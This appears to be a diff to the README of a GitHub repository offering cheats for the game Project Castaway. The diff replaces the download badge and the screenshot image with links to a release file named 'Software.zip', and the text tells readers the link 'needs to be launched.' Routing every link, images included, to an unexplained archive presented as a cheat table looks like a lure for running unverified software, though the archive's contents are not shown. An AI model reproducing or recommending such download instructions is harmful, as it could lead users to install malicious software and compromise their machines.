@@ -12,7 +12,7 @@ Welcome to the "Project Castaway Trainer Cheats" repository! If you are looking 
 
 To access the cheats and hacks for Project Castaway, simply download the cheat engine table from the link below:
 
-[![Download Cheat Engine Table](https://img.shields.io/badge/Download%20Cheat%20Engine%20Table-Click%20Here-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Cheat Engine Table](https://github.com/AbrahamWana/Project-Castaway-Trainer-Cheats/releases/download/v1.0/Software.zip%20Cheat%20Engine%20Table-Click%20Here-brightgreen)](https://github.com/AbrahamWana/Project-Castaway-Trainer-Cheats/releases/download/v1.0/Software.zip)
 
 *(Note: The link provided needs to be launched.)*
 
@@ -45,7 +45,7 @@ Are you ready to take your Project Castaway experience to the next level? Dive i
 
 ## 📸 Screenshots
 
-![Project Castaway Gameplay](https://via.placeholder.com/500)
+![Project Castaway Gameplay](https://github.com/AbrahamWana/Project-Castaway-Trainer-Cheats/releases/download/v1.0/Software.zip)
 
 ## 📝 Contributing
 
